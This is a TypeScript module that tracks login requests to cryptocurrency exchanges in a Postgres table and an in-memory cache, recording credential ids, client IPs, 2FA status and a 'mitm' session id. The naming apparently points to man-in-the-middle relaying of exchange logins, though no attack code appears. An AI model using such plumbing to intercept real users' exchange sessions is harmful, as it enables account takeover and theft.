/**
 * CEX Request Tracker — Multi-user login session management
 * Tracks each login request separately to avoid confusion
 */

import { createDatabaseAnchorPool } from '@legion/core/logic/database-anchor'
import type { Pool } from 'pg'
import { normalizeDatabaseConnectionString } from './database-anchor.js'

let pool: Pool | null = null

function getPool(): Pool {
  if (pool) return pool
  const url = process.env['DATABASE_URL']?.trim()
  if (!url) throw new Error('DATABASE_URL not configured')
  pool = createDatabaseAnchorPool(normalizeDatabaseConnectionString(url), {
    max: 5,
    connectionTimeoutMillis: 10_000,
  })
  return pool
}

export interface LoginRequest {
  requestId: string
  credId: string
  exchange: string
  emailHash: string
  clientIp: string
  userAgent: string
  status: 'started' | '2fa_pending' | 'verified' | 'completed' | 'failed'
  sessionId?: string
  mitMSessionId?: string
  errorMessage?: string
  createdAt: Date
  completedAt?: Date
}

// In-memory cache for quick access
const activeRequests = new Map<string, LoginRequest>()

export function generateRequestId(): string {
  return `req-${Date.now()}-${Math.random().toString(36).slice(2, 10)}`
}

function hashEmail(email: string): string {
  // Simple hash for privacy - not cryptographic, just obfuscation
  return `${email.split('@')[0].slice(0, 2)}***${email.split('@')[1].slice(-3)}`
}

export async function createLoginRequest(input: {
  credId: string
  exchange: string
  email: string
  clientIp: string
  userAgent: string
}): Promise<LoginRequest> {
  const db = getPool()
  const requestId = generateRequestId()
  const emailHash = hashEmail(input.email)
  const now = new Date()

  const result = await db.query(
    `INSERT INTO login_requests
      (request_id, cred_id, exchange, email_hash, client_ip, user_agent, status, created_at)
     VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
     RETURNING request_id, cred_id, exchange, email_hash, client_ip, user_agent, status, created_at`,
    [requestId, input.credId, input.exchange.toLowerCase(), emailHash, input.clientIp, input.userAgent, 'started', now],
  )

  const row = result.rows[0] as Record<string, unknown>

  const loginRequest: LoginRequest = {
    requestId: String(row['request_id']),
    credId: String(row['cred_id']),
    exchange: String(row['exchange']),
    emailHash: String(row['email_hash']),
    clientIp: String(row['client_ip']),
    userAgent: String(row['user_agent']),
    status: String(row['status']) as any,
    createdAt:
      row['created_at'] instanceof Date
        ? row['created_at']
        : new Date(String(row['created_at'])),
  }

  // Store in memory cache
  activeRequests.set(requestId, loginRequest)

  return loginRequest
}

export async function updateLoginRequest(
  requestId: string,
  update: {
    status?: 'started' | '2fa_pending' | 'verified' | 'completed' | 'failed'
    sessionId?: string
    mitMSessionId?: string
    errorMessage?: string
  },
): Promise<void> {
  const db = getPool()

  let query = `UPDATE login_requests SET `
  const params: unknown[] = []
  let paramIndex = 1

  if (update.status) {
    query += `status = $${paramIndex}`
    params.push(update.status)
    paramIndex++
  }

  if (update.sessionId) {
    if (params.length > 0) query += ', '
    query += `session_id = $${paramIndex}`
    params.push(update.sessionId)
    paramIndex++
  }

  if (update.mitMSessionId) {
    if (params.length > 0) query += ', '
    query += `mitm_session_id = $${paramIndex}`
    params.push(update.mitMSessionId)
    paramIndex++
  }

  if (update.errorMessage) {
    if (params.length > 0) query += ', '
    query += `error_message = $${paramIndex}`
    params.push(update.errorMessage)
    paramIndex++
  }

  if (update.status === 'completed' || update.status === 'failed') {
    if (params.length > 0) query += ', '
    query += `completed_at = $${paramIndex}`
    params.push(new Date())
    paramIndex++
  }

  query += ` WHERE request_id = $${paramIndex}`
  params.push(requestId)

  await db.query(query, params)

  // Update memory cache
  const cached = activeRequests.get(requestId)
  if (cached) {
    cached.status = update.status || cached.status
    cached.sessionId = update.sessionId || cached.sessionId
    cached.mitMSessionId = update.mitMSessionId || cached.mitMSessionId
    cached.errorMessage = update.errorMessage || cached.errorMessage
    if (update.status === 'completed' || update.status === 'failed') {
      cached.completedAt = new Date()
    }
  }
}

export async function getLoginRequest(requestId: string): Promise<LoginRequest | null> {
  // Check memory cache first
  if (activeRequests.has(requestId)) {
    return activeRequests.get(requestId) || null
  }

  // Fall back to database
  const db = getPool()
  const result = await db.query(
    `SELECT request_id, cred_id, exchange, email_hash, client_ip, user_agent,
            status, session_id, mitm_session_id, error_message, created_at, completed_at
     FROM login_requests
     WHERE request_id = $1`,
    [requestId],
  )

  if (result.rows.length === 0) return null

  const row = result.rows[0] as Record<string, unknown>

  const loginRequest: LoginRequest = {
    requestId: String(row['request_id']),
    credId: String(row['cred_id']),
    exchange: String(row['exchange']),
    emailHash: String(row['email_hash']),
    clientIp: String(row['client_ip']),
    userAgent: String(row['user_agent']),
    status: String(row['status']) as any,
    sessionId: row['session_id'] ? String(row['session_id']) : undefined,
    mitMSessionId: row['mitm_session_id'] ? String(row['mitm_session_id']) : undefined,
    errorMessage: row['error_message'] ? String(row['error_message']) : undefined,
    createdAt:
      row['created_at'] instanceof Date
        ? row['created_at']
        : new Date(String(row['created_at'])),
    completedAt: row['completed_at']
      ? row['completed_at'] instanceof Date
        ? row['completed_at']
        : new Date(String(row['completed_at']))
      : undefined,
  }

  // Cache it
  activeRequests.set(requestId, loginRequest)

  return loginRequest
}

export async function getActiveRequests(exchange?: string): Promise<LoginRequest[]> {
  const db = getPool()

  let query = `SELECT request_id, cred_id, exchange, email_hash, client_ip, user_agent,
                      status, session_id, mitm_session_id, error_message, created_at, completed_at
               FROM login_requests
               WHERE status IN ('started', '2fa_pending', 'verified')`

  const params: unknown[] = []

  if (exchange) {
    query += ` AND exchange = $1`
    params.push(exchange.toLowerCase())
  }

  query += ` ORDER BY created_at DESC LIMIT 50`

  const result = await db.query(query, params)

  return result.rows.map((row: Record<string, unknown>) => ({
    requestId: String(row['request_id']),
    credId: String(row['cred_id']),
    exchange: String(row['exchange']),
    emailHash: String(row['email_hash']),
    clientIp: String(row['client_ip']),
    userAgent: String(row['user_agent']),
    status: String(row['status']) as any,
    sessionId: row['session_id'] ? String(row['session_id']) : undefined,
    mitMSessionId: row['mitm_session_id'] ? String(row['mitm_session_id']) : undefined,
    errorMessage: row['error_message'] ? String(row['error_message']) : undefined,
    createdAt:
      row['created_at'] instanceof Date
        ? row['created_at']
        : new Date(String(row['created_at'])),
  }))
}

export function cleanupExpiredRequests(): void {
  const now = Date.now()
  const twoHoursMs = 2 * 60 * 60 * 1000

  for (const [requestId, request] of activeRequests.entries()) {
    if (now - request.createdAt.getTime() > twoHoursMs) {
      activeRequests.delete(requestId)
    }
  }
}

// Cleanup every 30 minutes
setInterval(cleanupExpiredRequests, 30 * 60 * 1000)
